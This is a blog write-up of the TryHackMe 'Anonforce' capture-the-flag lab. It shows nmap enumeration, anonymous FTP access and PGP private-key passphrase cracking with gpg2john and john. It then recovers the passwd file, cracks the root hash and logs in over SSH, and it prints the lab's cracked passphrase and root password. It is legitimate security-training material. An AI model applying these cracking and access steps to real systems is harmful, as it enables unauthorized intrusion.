---
title: TryHackMe - Anonforce
author: Bonface
date: 2024-10-31 00:00:00 +0000
categories: [TryHackMe]
tags: [tryhackme, linux, nmap, privesc, ftp, ssh, gpg, john, crack]
img_path: /assets/img/Anonforce
image:
    path: 0.jpeg
---

# Anonforce  

boot2root machine for FIT and bsides guatemala CTF  

# Tasks  
Read user.txt and root.txt  

# nmap

```sh
nmap -sV -sC -v 10.10.59.93 | tee nmap.txt
```

```sh
PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 2 0 0
4096 Aug 11 2019 bin
| drwxr-xr-x 3 0 0
4096 Aug 11 2019 boot
| drwxr-xr-x 17 0 0
3700 Feb 08 07:18 dev
| drwxr-xr-x 85 0 0
4096 Aug 13 2019 etc
| drwxr-xr-x 3 0 0
4096 Aug 11 2019 home
| lrwxrwxrwx 1 0 0
33 Aug 11 2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx 1 0 0
33 Aug 11 2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x 19 0 0
4096 Aug 11 2019 lib
| drwxr-xr-x 2 0 0
4096 Aug 11 2019 lib64
| drwx------ 2 0 0
16384 Aug 11 2019 lost+found
| drwxr-xr-x 4 0 0
4096 Aug 11 2019 media
| drwxr-xr-x 2 0 0
4096 Feb 26 2019 mnt
| drwxrwxrwx 2 1000 1000
4096 Aug 11 2019 notread [NSE: writeable]
| drwxr-xr-x 2 0 0
4096 Aug 11 2019 opt
| dr-xr-xr-x 94 0 0
0 Feb 08 07:18 proc
| drwx------ 3 0 0
4096 Aug 11 2019 root
| drwxr-xr-x 18 0 0
540 Feb 08 07:18 run
| drwxr-xr-x 2 0 0
12288 Aug 11 2019 sbin
| drwxr-xr-x 3 0 0
4096 Aug 11 2019 srv
| dr-xr-xr-x 13 0 0
0 Feb 08 07:18 sys
| drwxrwxrwt 9 0 0
4096 Feb 08 07:18 tmp [NSE: writeable]
| drwxr-xr-x 10 0 0
4096 Aug 11 2019 usr
| drwxr-xr-x 11 0 0
4096 Aug 11 2019 var
| lrwxrwxrwx 1 0 0
30 Aug 11 2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
|_lrwxrwxrwx 1 0 0
30 Aug 11 2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
| ftp-syst:
| STAT:
| FTP server status:
| Connected to ::ffff:10.8.172.59
| Logged in as ftp
| TYPE: ASCII
| No session bandwidth limit
| Session timeout in seconds is 300
1/9| Control connection is plain text
| Data connections will be plain text
| At session startup, client count was 2
| vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
| 2048 8a:f9:48:3e:11:a1:aa:fc:b7:86:71:d0:2a:f6:24:e7 (RSA)
| 256 73:5d:de:9a:88:6e:64:7a:e1:87:ec:65:ae:11:93:e3 (ECDSA)
|_ 256 56:f9:9f:24:f1:52:fc:16:b7:7b:a3:e2:4f:17:b4:ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```
Two ports are open  
- 21 = ftp  
- 22 = ssh  

ftp seems to lack log in credentials so will start with that one.  

# ftp_21
```sh
ftp anonymous@10.10.59.93
```

Used default credentials `anonymous:anonymous`  
![](/assets/img/Anonforce/1.png)  
Enumerating i got the user flag .  

![](/assets/img/Anonforce/2.png)

# Privilege Escalation

![](/assets/img/Anonforce/2.png)

- We can not view or write any thing on the root directory
- But there is a fishy directory with unique permissions.

```sh
cd notread
mget *
```
![](/assets/img/Anonforce/4.png)  
one file is an image while the other has some guddies  
![](/assets/img/Anonforce/5.png)

Now we have 
- open port 22 = ssh
- id_rsa key

Lacking a valid user name .
run search_sploit to see if the ssh has an exploit
![](/assets/img/Anonforce/6.png)

- Downloaded the exploit but was unable to use it.
- Did some research.

We got two files from ftp :
- backup.pgp  
- private.asc  

We have an encrypted `backup.pgp` file, and very likely a private key file that we can use to decrypt it.  
First, what we need to do is import the private key into our keyring (key management database) of the PGP application.  

```sh
gpg --import private.asc
```
![](/assets/img/Anonforce/7.png)

We need to crack the passphrase in order to import it into the key ring.  
We can use `John the Ripper` password-cracking tool for this.  

```sh
 gpg2john private.asc > privatehash.txt
```

Now we can run john to crack the hash using the famous `rockyou.txt` dictionary.  

```sh
 john privatehash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
![](/assets/img/Anonforce/8.png)

Now that we have the passphrase for the private key, we can import it into the keyring and decrypt the backup.pgp file.  

passphrase = `xbox360`

```sh
gpg --import private.asc

gpg --decrypt backup.pgp
```
![](/assets/img/Anonforce/9.png)
We will get a backup of the passwd file, that includes the password hash of root and melodias users.  
![](/assets/img/Anonforce/10.png)

Now we crack the passwd file using john.
![](/assets/img/Anonforce/11.png)
![](/assets/img/Anonforce/12.png)

  
- username = root  
- password = hikari  

```sh
 ssh root@10.10.59.93
 ```  
![](/assets/img/Anonforce/13.png)
